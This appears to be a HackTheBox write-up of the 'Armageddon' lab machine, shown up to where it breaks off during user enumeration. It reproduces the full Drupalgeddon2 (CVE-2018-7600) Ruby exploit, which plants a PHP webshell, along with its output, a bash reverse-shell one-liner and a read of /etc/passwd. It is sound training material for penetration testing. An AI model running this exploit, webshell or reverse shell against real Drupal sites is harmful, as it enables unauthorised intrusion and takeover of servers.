# Armageddon

Difficulty: Easy
OS: Linux
OSCP Like: No
Points: 20
Released: 27 mars 2021
Root Flag: Yes
Status: Done
Tags: burp, drupal, drupalgeddon2, hashcat, mysql, nmap, oscp-like, searchsploit, snap, snapcraft, sudo, ubuntu, upload, webshell
User Flag: Yes

# Armageddon

## Synopsis

Armageddon was a box targeted at beginners. The foothold exploit, `Drupalgeddon2` has many public exploit scripts that can be used to upload a webshell and run commands. I’ll get access to the database and get the admin’s hash, crack it, and find that password is reused on the host as well. To get root, I’ll abuse the admin’s ability to install snap packages as root.

## Recon

### nmap

nmap found two open TCP ports, SSH (22) and HTTP (80):

```bash
oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.233

Starting Nmap 7.91 ( [https://nmap.org](https://nmap.org/) ) at 2021-03-26 06:49 EDT
Nmap scan report for 10.10.10.233
Host is up (0.091s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
```

```bash
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.233
Starting Nmap 7.91 ( [https://nmap.org](https://nmap.org/) ) at 2021-03-26 06:50 EDT
Nmap scan report for 10.10.10.233
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|*http-generator: Drupal 7 ([http://drupal.org](http://drupal.org/))
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|*/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 10.76 seconds
```

Based on the Apache version, the host is likely running CentOS 7. The HTTP is hosting a Drupal 7 instance, and there’s a robots.txt file with a bunch of paths that I may want to check out in more detail.

## Website - TCP 80

### Site

The site doesn’t have much content on it:

In the page source, the Drupal version is clear:

```bash
<meta name="Generator" content="Drupal 7 ([http://drupal.org](http://drupal.org/))" />
```

### code

The `robots.txt` file looks exactly the same as the one on Drupal’s GitHub, so nothing interesting there. I did change the branch on GitHub to 7.X to get the code the was closest to the version on Armageddon to see that match.

I can try to create an account, but the process involves getting an email, which is typically not an option on HTB. I could try seeing if it will send to my IP, but the site throws errors that suggests it can’t send:

### Version

In the Drupal GitHub, there’s a file at the root, `CHANGELOG.txt`. That file exists on Armageddon as well:

```bash
oxdf@parrot$ curl -s 10.10.10.233/CHANGELOG.txt | head

Drupal 7.56, 2017-06-21

- Fixed security issues (access bypass). See SA-CORE-2017-003.

Drupal 7.55, 2017-06-07

- Fixed incompatibility with PHP versions 7.0.19 and 7.1.5 due to duplicate
DATE_RFC7231 definition.
- Made Drupal core pass all automated tests on PHP 7.1.
This gives the exact version, 7.56.
Exploits
serachsploit shows a bunch of Drupal exploits (snipped out ones for non-7 versions):
oxdf@parrot$ searchsploit drupal 7
Exploit Title                                                         |  Path

---

...[snip]...
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)      | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)       | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Executio | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                 | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                     | php/webapps/41564.php
...[snip]...
Drupal < 7.34 - Denial of Service                                      | php/dos/35415.txt
Drupal < 7.34 - Denial of Service                                      | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploi | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution  | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution         | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                     | php/webapps/46459.py
...[snip]...
---
Shellcodes: No Results
```

There’s clearly a lot here. `Drupalgeddon` 2 and 3 both look like candidates.

## Shell as apache

### RCE - `Drupalgeddon2`

Given the number of exploits and the fact that the quality in `searchsploit` can be a bit all over the map, I went to Google, and found this repo. I’ll look at exactly what it’s doing in Beyond Root, but the repo itself works great. Running it provides a prompt:

```bash
#!/usr/bin/env ruby
#
# [CVE-2018-7600] Drupal <= 8.5.0 / <= 8.4.5 / <= 8.3.8 / 7.23 <= 7.57 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/
#
# Authors:
# - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked
# - g0tmi1k   ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k
#

require 'base64'
require 'json'
require 'net/http'
require 'openssl'
require 'readline'
require 'highline/import'

# Settings - Try to write a PHP to the web root?
try_phpshell = true
# Settings - General/Stealth
$useragent = "drupalgeddon2"
webshell = "shell.php"
# Settings - Proxy information (nil to disable)
$proxy_addr = nil
$proxy_port = 8080

# Settings - Payload (we could just be happy without this PHP shell, by using just the OS shell - but this is 'better'!)
bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d"

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

# Function http_request <url> [type] [data]
def http_request(url, type="get", payload="", cookie="")
  puts verbose("HTTP - URL : #{url}") if $verbose
  puts verbose("HTTP - Type: #{type}") if $verbose
  puts verbose("HTTP - Data: #{payload}") if not payload.empty? and $verbose

  begin
    uri = URI(url)
    request = type =~ /get/? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)
    request.initialize_http_header({"User-Agent" => $useragent})
    request.initialize_http_header("Cookie" => cookie) if not cookie.empty?
    request.body = payload if not payload.empty?
    return $http.request(request)
  rescue SocketError
    puts error("Network connectivity issue")
  rescue Errno::ECONNREFUSED => e
    puts error("The target is down ~ #{e.message}")
    puts error("Maybe try disabling the proxy (#{$proxy_addr}:#{$proxy_port})...") if $proxy_addr
  rescue Timeout::Error => e
    puts error("The target timed out ~ #{e.message}")
  end

  # If we got here, something went wrong.
  exit
end

# Function gen_evil_url <cmd> [method] [shell] [phpfunction]
def gen_evil_url(evil, element="", shell=false, phpfunction="passthru")
  puts info("Payload: #{evil}") if not shell
  puts verbose("Element    : #{element}") if not shell and not element.empty? and $verbose
  puts verbose("PHP fn     : #{phpfunction}") if not shell and $verbose

  # Vulnerable parameters: #access_callback / #lazy_builder / #pre_render / #post_render
  # Check the version to match the payload
  if $drupalverion.start_with?("8") and element == "mail"
    # Method #1 - Drupal v8.x: mail, #post_render - HTTP 200
    url = $target + $clean_url + $form + "?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + evil

  elsif $drupalverion.start_with?("8") and element == "timezone"
    # Method #2 - Drupal v8.x: timezone, #lazy_builder - HTTP 500 if phpfunction=exec // HTTP 200 if phpfunction=passthru
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=" + phpfunction + "&timezone[a][#lazy_builder][][]=" + evil

    #puts warning("WARNING: May benefit to use a PHP web shell") if not try_phpshell and phpfunction != "passthru"

  elsif $drupalverion.start_with?("7") and element == "name"
    # Method #3 - Drupal v7.x: name, #post_render - HTTP 200
    url = $target + "#{$clean_url}#{$form}&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
    payload = "form_id=user_pass&_triggering_element_name=name"
  end

  # Drupal v7.x needs an extra value from a form
  if $drupalverion.start_with?("7")
    response = http_request(url, "post", payload, $session_cookie)

    form_name = "form_build_id"
    puts verbose("Form name  : #{form_name}") if $verbose

    form_value = response.body.match(/input type="hidden" name="#{form_name}" value="(.*)"/).to_s.slice(/value="(.*)"/, 1).to_s.strip
    puts warning("WARNING: Didn't detect #{form_name}") if form_value.empty?
    puts verbose("Form value : #{form_value}") if $verbose

    url = $target + "#{$clean_url}file/ajax/name/%23value/" + form_value
    payload = "#{form_name}=#{form_value}"
  end

  return url, payload
end

# Function clean_result <input>
def clean_result(input)
  #result = JSON.pretty_generate(JSON[response.body])
  #result = $drupalverion.start_with?("8")? JSON.parse(clean)[0]["data"] : clean
  clean = input.to_s.strip

  # PHP function: passthru
  # For: <payload>[{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
  clean.slice!(/\[{"command":".*}\]$/)

  # PHP function: exec
  # For: [{"command":"insert","method":"replaceWith","selector":null,"data":"<payload>\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
  #clean.slice!(/\[{"command":".*data":"/)
  #clean.slice!(/\\u003Cspan class=\\u0022.*}\]$/)

  # Newer PHP for an older Drupal
  # For: <b>Deprecated</b>:  assert(): Calling assert() with a string argument is deprecated in <b>/var/www/html/core/lib/Drupal/Core/Plugin/DefaultPluginManager.php</b> on line <b>151</b><br />
  #clean.slice!(/<b>.*<br \/>/)

  # Drupal v8.x Method #2 ~ timezone, #lazy_builder, passthru, HTTP 500
  # For: <b>Deprecated</b>:  assert(): Calling assert() with a string argument is deprecated in <b>/var/www/html/core/lib/Drupal/Core/Plugin/DefaultPluginManager.php</b> on line <b>151</b><br />
  clean.slice!(/The website encountered an unexpected error.*/)

  return clean
end

# Feedback when something goes right
def success(text)
  # Green
  return "\e[#{32}m[+]\e[0m #{text}"
end

# Feedback when something goes wrong
def error(text)
  # Red
  return "\e[#{31}m[-]\e[0m #{text}"
end

# Feedback when something may have issues
def warning(text)
  # Yellow
  return "\e[#{33}m[!]\e[0m #{text}"
end

# Feedback when something doing something
def action(text)
  # Blue
  return "\e[#{34}m[*]\e[0m #{text}"
end

# Feedback with helpful information
def info(text)
  # Light blue
  return "\e[#{94}m[i]\e[0m #{text}"
end

# Feedback for the overkill
def verbose(text)
  # Dark grey
  return "\e[#{90}m[v]\e[0m #{text}"
end

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

def init_authentication()
  $uname = ask('Enter your username:  ') { |q| q.echo = false }
  $passwd = ask('Enter your password:  ') { |q| q.echo = false }
  $uname_field = ask('Enter the name of the username form field:  ') { |q| q.echo = true }
  $passwd_field = ask('Enter the name of the password form field:  ') { |q| q.echo = true }
  $login_path = ask('Enter your login path (e.g., user/login):  ') { |q| q.echo = true }
  $creds_suffix = ask('Enter the suffix eventually required after the credentials in the login HTTP POST request (e.g., &form_id=...):  ') { |q| q.echo = true }
end

def is_arg(args, param)
  args.each do |arg|
    if arg == param
      return true
    end
  end
  return false
end

# Quick how to use
def usage()
  puts 'Usage: ruby drupalggedon2.rb <target> [--authentication] [--verbose]'
  puts 'Example for target that does not require authentication:'
  puts '       ruby drupalgeddon2.rb https://example.com'
  puts 'Example for target that does require authentication:'
  puts '       ruby drupalgeddon2.rb https://example.com --authentication'
end

# Read in values
if ARGV.empty?
  usage()
  exit
end

$target = ARGV[0]
init_authentication() if is_arg(ARGV, '--authentication')
$verbose = is_arg(ARGV, '--verbose')

# Check input for protocol
$target = "http://#{$target}" if not $target.start_with?("http")
# Check input for the end
$target += "/" if not $target.end_with?("/")

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

# Banner
puts action("--==[::#Drupalggedon2::]==--")
puts "-"*80
puts info("Target : #{$target}")
puts info("Proxy  : #{$proxy_addr}:#{$proxy_port}") if $proxy_addr
puts info("Write? : Skipping writing PHP web shell") if not try_phpshell
puts "-"*80

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

# Setup connection
uri = URI($target)
$http = Net::HTTP.new(uri.host, uri.port, $proxy_addr, $proxy_port)

# Use SSL/TLS if needed
if uri.scheme == "https"
  $http.use_ssl = true
  $http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end

$session_cookie = ''
# If authentication required then login and get session cookie
if $uname
  $payload = $uname_field + '=' + $uname + '&' + $passwd_field + '=' + $passwd + $creds_suffix
  response = http_request($target + $login_path, 'post', $payload, $session_cookie)
  if (response.code == '200' or response.code == '303') and not response.body.empty? and response['set-cookie']
    $session_cookie = response['set-cookie'].split('; ')[0]
    puts success("Logged in - Session Cookie : #{$session_cookie}")
  end

end

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

# Try and get version
$drupalverion = ""

# Possible URLs
url = [
  # --- changelog ---
  # Drupal v6.x / v7.x [200]
  $target + "CHANGELOG.txt",
  # Drupal v8.x [200]
  $target + "core/CHANGELOG.txt",

  # --- bootstrap ---
  # Drupal v7.x / v6.x [403]
  $target + "includes/bootstrap.inc",
  # Drupal v8.x [403]
  $target + "core/includes/bootstrap.inc",

  # --- database ---
  # Drupal v7.x / v6.x  [403]
  $target + "includes/database.inc",
  # Drupal v7.x [403]
  #$target + "includes/database/database.inc",
  # Drupal v8.x [403]
  #$target + "core/includes/database.inc",

  # --- landing page ---
  # Drupal v8.x / v7.x [200]
  $target,
]

# Check all
url.each do|uri|
  # Check response
  response = http_request(uri, 'get', '', $session_cookie)

  # Check header
  if response['X-Generator'] and $drupalverion.empty?
    header = response['X-Generator'].slice(/Drupal (.*) \(https?:\/\/(www.)?drupal.org\)/, 1).to_s.strip

    if not header.empty?
      $drupalverion = "#{header}.x" if $drupalverion.empty?
      puts success("Header : v#{header} [X-Generator]")
      puts verbose("X-Generator: #{response['X-Generator']}") if $verbose
    end
  end

  # Check request response, valid
  if response.code == "200"
    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
    puts success("Found  : #{uri}    (HTTP Response: #{response.code})#{tmp}")

    # Check to see if it says: The requested URL "http://<URL>" was not found on this server.
    puts warning("WARNING: Could be a false-positive [1-1], as the file could be reported to be missing") if response.body.downcase.include? "was not found on this server"

    # Check to see if it says: <h1 class="js-quickedit-page-title title page-title">Page not found</h1> <div class="content">The requested page could not be found.</div>
    puts warning("WARNING: Could be a false-positive [1-2], as the file could be reported to be missing") if response.body.downcase.include? "the requested page could not be found"

    # Only works for CHANGELOG.txt
    if uri.match(/CHANGELOG.txt/)
      # Check if valid. Source ~ https://api.drupal.org/api/drupal/core%21CHANGELOG.txt/8.5.x // https://api.drupal.org/api/drupal/CHANGELOG.txt/7.x
      puts warning("WARNING: Unable to detect keyword 'drupal.org'") if not response.body.downcase.include? "drupal.org"

      # Patched already? (For Drupal v8.4.x / v7.x)
      puts warning("WARNING: Might be patched! Found SA-CORE-2018-002: #{url}") if response.body.include? "SA-CORE-2018-002"

      # Try and get version from the file contents (For Drupal v8.4.x / v7.x)
      $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip

      # Blank if not valid
      $drupalverion = "" if not $drupalverion[-1] =~ /\d/
    end

    # Check meta tag
    if not response.body.empty?
      # For Drupal v8.x / v7.x
      meta = response.body.match(/<meta name="Generator" content="Drupal (.*) /)
      metatag = meta.to_s.slice(/meta name="Generator" content="Drupal (.*) \(http/, 1).to_s.strip

      if not metatag.empty?
        $drupalverion = "#{metatag}.x" if $drupalverion.empty?
        puts success("Metatag: v#{$drupalverion} [Generator]")
        puts verbose(meta.to_s) if $verbose
      end
    end

    # Done! ...if a full known version, else keep going... may get lucky later!
    break if not $drupalverion.end_with?("x") and not $drupalverion.empty?
  end

  # Check request response, not allowed
  if response.code == "403" and $drupalverion.empty?
    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
    puts success("Found  : #{uri}    (HTTP Response: #{response.code})#{tmp}")

    if $drupalverion.empty?
      # Try and get version from the URL (For Drupal v.7.x/v6.x)
      $drupalverion = uri.match(/includes\/database.inc/)? "7.x/6.x" : "" if $drupalverion.empty?
      # Try and get version from the URL (For Drupal v8.x)
      $drupalverion = uri.match(/core/)? "8.x" : "" if $drupalverion.empty?

      # If we got something, show it!
      puts success("URL    : v#{$drupalverion}?") if not $drupalverion.empty?
    end

  else
    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
    puts warning("MISSING: #{uri}    (HTTP Response: #{response.code})#{tmp}")
  end
end

# Feedback
if not $drupalverion.empty?
  status = $drupalverion.end_with?("x")? "?" : "!"
  puts success("Drupal#{status}: v#{$drupalverion}")
else
  puts error("Didn't detect Drupal version")
  exit
end

if not $drupalverion.start_with?("8") and not $drupalverion.start_with?("7")
  puts error("Unsupported Drupal version (#{$drupalverion})")
  exit
end
puts "-"*80

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

# The attack vector to use
$form = $drupalverion.start_with?("8")? "user/register" : "user/password"

# Make a request, check for form
url = "#{$target}?q=#{$form}"
puts action("Testing: Form   (#{$form})")
response = http_request(url, 'get', '', $session_cookie)
if response.code == "200" and not response.body.empty?
  puts success("Result : Form valid")
elsif response['location']
  puts error("Target is NOT exploitable [5] (HTTP Response: #{response.code})...   Could try following the redirect: #{response['location']}")
  exit
elsif response.code == "404"
  puts error("Target is NOT exploitable [4] (HTTP Response: #{response.code})...   Form disabled?")
  exit
elsif response.code == "403"
  puts error("Target is NOT exploitable [3] (HTTP Response: #{response.code})...   Form blocked?")
  exit
elsif response.body.empty?
  puts error("Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response")
  exit
else
  puts warning("WARNING: Target may NOT exploitable [1] (HTTP Response: #{response.code})")
end

puts "- "*40

# Make a request, check for clean URLs status ~ Enabled: /user/register   Disabled: /?q=user/register
# Drupal v7.x needs it anyway
$clean_url = $drupalverion.start_with?("8")? "" : "?q="
url = "#{$target}#{$form}"

puts action("Testing: Clean URLs")
response = http_request(url, 'get', '', $session_cookie)
if response.code == "200" and not response.body.empty?
  puts success("Result : Clean URLs enabled")
else
  $clean_url = "?q="
  puts warning("Result : Clean URLs disabled (HTTP Response: #{response.code})")
  puts verbose("response.body: #{response.body}") if $verbose

  # Drupal v8.x needs it to be enabled
  if $drupalverion.start_with?("8")
    puts error("Sorry dave... Required for Drupal v8.x... So... NOPE NOPE NOPE")
    exit
  elsif $drupalverion.start_with?("7")
    puts info("Isn't an issue for Drupal v7.x")
  end
end
puts "-"*80

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

# Values in gen_evil_url for Drupal v8.x
elementsv8 = [
  "mail",
  "timezone",
]
# Values in gen_evil_url for Drupal v7.x
elementsv7 = [
  "name",
]

elements = $drupalverion.start_with?("8") ? elementsv8 : elementsv7

elements.each do|e|
  $element = e

  # Make a request, testing code execution
  puts action("Testing: Code Execution   (Method: #{$element})")

  # Generate a random string to see if we can echo it
  random = (0...8).map { (65 + rand(26)).chr }.join
  url, payload = gen_evil_url("echo #{random}", e)

  response = http_request(url, "post", payload, $session_cookie)
  if (response.code == "200" or response.code == "500") and not response.body.empty?
    result = clean_result(response.body)
    if not result.empty?
      puts success("Result : #{result}")

      if response.body.match(/#{random}/)
        puts success("Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!")
        break

      else
        puts warning("WARNING: Target MIGHT be exploitable [4]...   Detected output, but didn't MATCH expected result")
      end

    else
      puts warning("WARNING: Target MIGHT be exploitable [3] (HTTP Response: #{response.code})...   Didn't detect any INJECTED output (disabled PHP function?)")
    end

    puts warning("WARNING: Target MIGHT be exploitable [5]...   Blind attack?") if response.code == "500"

    puts verbose("response.body: #{response.body}") if $verbose
    puts verbose("clean_result: #{result}") if not result.empty? and $verbose

  elsif response.body.empty?
    puts error("Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response")
    exit

  else
    puts error("Target is NOT exploitable [1] (HTTP Response: #{response.code})")
    puts verbose("response.body: #{response.body}") if $verbose
    exit
  end

  puts "- "*40 if e != elements.last
end

puts "-"*80

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

# Location of web shell & used to signal if using PHP shell
webshellpath = ""
prompt = "drupalgeddon2"

# Possibles paths to try
paths = [
  # Web root
  "",
  # Required for setup
  "sites/default/",
  "sites/default/files/",
  # They did something "wrong", chmod -R 0777 .
  #"core/",
]
# Check all (if doing web shell)
paths.each do|path|
  # Check to see if there is already a file there
  puts action("Testing: Existing file   (#{$target}#{path}#{webshell})")

  response = http_request("#{$target}#{path}#{webshell}", 'get', '', $session_cookie)
  if response.code == "200"
    puts warning("Response: HTTP #{response.code} // Size: #{response.size}.   ***Something could already be there?***")
  else
    puts info("Response: HTTP #{response.code} // Size: #{response.size}")
  end

  puts "- "*40

  # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

  folder = path.empty? ? "./" : path
  puts action("Testing: Writing To Web Root   (#{folder})")

  # Merge locations
  webshellpath = "#{path}#{webshell}"

  # Final command to execute
  cmd = "#{bashcmd} | tee #{webshellpath}"

  # By default, Drupal v7.x disables the PHP engine using: ./sites/default/files/.htaccess
  # ...however, Drupal v8.x disables the PHP engine using: ./.htaccess
  if path == "sites/default/files/"
    puts action("Moving : ./sites/default/files/.htaccess")
    cmd = "mv -f #{path}.htaccess #{path}.htaccess-bak; #{cmd}"
  end

  # Generate evil URLs
  url, payload = gen_evil_url(cmd, $element)
  # Make the request
  response = http_request(url, "post", payload, $session_cookie)
  # Check result
  if response.code == "200" and not response.body.empty?
    # Feedback
    result = clean_result(response.body)
    puts success("Result : #{result}") if not result.empty?

    # Test to see if backdoor is there (if we managed to write it)
    response = http_request("#{$target}#{webshellpath}", "post", "c=hostname", $session_cookie)
    if response.code == "200" and not response.body.empty?
      puts success("Very Good News Everyone! Wrote to the web root! Waayheeeey!!!")
      break

    elsif response.code == "404"
      puts warning("Target is NOT exploitable [2-4] (HTTP Response: #{response.code})...   Might not have write access?")

    elsif response.code == "403"
      puts warning("Target is NOT exploitable [2-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?")

    elsif response.body.empty?
      puts warning("Target is NOT exploitable [2-2] (HTTP Response: #{response.code})...   Got an empty response back")

    else
      puts warning("Target is NOT exploitable [2-1] (HTTP Response: #{response.code})")
      puts verbose("response.body: #{response.body}") if $verbose
    end

  elsif response.code == "500" and not response.body.empty?
    puts warning("Target MAY of been exploited... Bit of blind leading the blind")
    break

  elsif response.code == "404"
    puts warning("Target is NOT exploitable [1-4] (HTTP Response: #{response.code})...   Might not have write access?")

  elsif response.code == "403"
    puts warning("Target is NOT exploitable [1-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?")

  elsif response.body.empty?
    puts warning("Target is NOT exploitable [1-2] (HTTP Response: #{response.code}))...   Got an empty response back")

  else
    puts warning("Target is NOT exploitable [1-1] (HTTP Response: #{response.code})")
    puts verbose("response.body: #{response.body}") if $verbose
  end

  webshellpath = ""

  puts "- "*40 if path != paths.last
end if try_phpshell

# If a web path was set, we exploited using PHP!
if not webshellpath.empty?
  # Get hostname for the prompt
  prompt = response.body.to_s.strip if response.code == "200" and not response.body.empty?

  puts "-"*80
  puts info("Fake PHP shell:   curl '#{$target}#{webshellpath}' -d 'c=hostname'")
# Should we be trying to call commands via PHP?
elsif try_phpshell
  puts warning("FAILED : Couldn't find a writeable web path")
  puts "-"*80
  puts action("Dropping back to direct OS commands")
end

# Stop any CTRL + C action ;)
trap("INT", "SIG_IGN")

# Forever loop
loop do
  # Default value
  result = "~ERROR~"

  # Get input
  command = Readline.readline("#{prompt}>> ", true).to_s

  # Check input
  puts warning("WARNING: Detected an known bad character (>)") if command =~ />/

  # Exit
  break if command == "exit"

  # Blank link?
  next if command.empty?

  # If PHP web shell
  if not webshellpath.empty?
    # Send request
    result = http_request("#{$target}#{webshellpath}", "post", "c=#{command}", $session_cookie).body
  # Direct OS commands
  else
    url, payload = gen_evil_url(command, $element, true)
    response = http_request(url, "post", payload, $session_cookie)

    # Check result
    if not response.body.empty?
      result = clean_result(response.body)
    end
  end

  # Feedback
  puts result
end
```

```bash
oxdf@parrot$ /opt/Drupalgeddon2/drupalgeddon2.rb [http://10.10.10.233](http://10.10.10.233/)

[*] --==[::#Drupalggedon2::]==--

[i] Target : [http://10.10.10.233/](http://10.10.10.233/)

[+] Found : [http://10.10.10.233/CHANGELOG.txt](http://10.10.10.233/CHANGELOG.txt) (HTTP Response: 200)

[+] Drupal!: v7.56

[*] Testing: Form   (user/password)
[+] Result : Form valid
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x

[*] Testing: Code Execution (Method: name)
[i] Payload: echo SNQOQAOF
[+] Result : SNQOQAOF
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!

[*] Testing: Existing file   ([http://10.10.10.233/shell.php](http://10.10.10.233/shell.php))
[!] Response: HTTP 200 // Size: 6.   ***Something could already be there?***
[*] Testing: Writing To Web Root (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
[i] Fake PHP shell:   curl '[http://10.10.10.233/shell.php](http://10.10.10.233/shell.php)' -d 'c=hostname'

armageddon.htb>>
```

```bash
armageddon.htb>> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

```bash
oxdf@parrot$ curl '[http://10.10.10.233/shell.php](http://10.10.10.233/shell.php)' -d 'c=id'

uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

The prompt works like a shell:

The last line before the prompt suggests it just has a webshell running. It works too:
Shell
To get a shell, I triggered the same webshell with a Bash reverse shell:

```bash
oxdf@parrot$ curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.7/443 0>&1" '[http://10.10.10.233/shell.php](http://10.10.10.233/shell.php)'
```

```bash
oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.233] 36008
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

```bash
bash-4.2$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
Traceback (most recent call last):
File "<string>", line 1, in <module>
File "/usr/lib64/python3.6/pty.py", line 154, in spawn
pid, master_fd = fork()
File "/usr/lib64/python3.6/pty.py", line 96, in fork
master_fd, slave_fd = openpty()
File "/usr/lib64/python3.6/pty.py", line 29, in openpty
master_fd, slave_name = _open_terminal()
File "/usr/lib64/python3.6/pty.py", line 59, in _open_terminal
raise OSError('out of pty devices')
OSError: out of pty devices
```

`curl` hangs, but at my listening `nc`:
I tried to do the shell upgrade, but it complains about being out of PTY devices:
I wasn’t able to find a way around that. I didn’t really need a PTY shell, but if I did, I would have tried uploading `socat` next.

## Shell as `brucetherealadmin`

### Enumeration

### Users

Typically I go look at `/home` to see what other users are on the box and where I might want to pivot next. Interestingly, I can’t see anything in `/home`:

```bash
bash-4.2$ ls -l /home
ls -l /home
ls: cannot open directory /home: Permission denied
```

Looking at `/etc/passwd`, there’s one other account of interest, `brucetherealadmin`:

```bash
bash-4.2$ cat /etc/passwd | grep sh
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
